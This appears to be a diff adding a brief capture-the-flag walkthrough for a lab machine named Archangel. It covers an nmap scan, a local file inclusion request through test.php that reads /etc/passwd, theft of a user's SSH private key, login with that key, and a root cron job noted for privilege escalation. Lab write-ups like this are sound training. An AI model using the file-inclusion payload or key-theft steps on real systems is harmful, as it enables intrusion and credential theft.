@@ -1,0 +1,44 @@
+----------------                               ------------------
+               :::::::::::;| ARCHANGEL |;::::::::::::
+
+
+1) SPIN UP THE MACHINE AND NOTE IP.
+
+TASK - 1 (RECON)
+
+1. Initial scan:
+nmap -sV <ip> -vv
+"Ports 22/SSH, 80/HTTP open"
+
+2. Web check:
+http://<ip>
+"Hidden /test.php page found"
+"Reveals absolute path disclosure"
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. LFI test:
+http://<ip>/test.php?view=/etc/passwd
+"Works! Can read system files"
+
+2. Get SSH key:
+"Read /home/archangel/.ssh/id_rsa"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (PRIV ESC)
+
+1. SSH access:
+chmod 600 id_rsa
+ssh -i id_rsa archangel@<ip>
+"User shell obtained"
+
+2. Cron job found:
+"Running as root every minute"
+"Write to script location"
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- ARCHANGEL FALLEN ----------
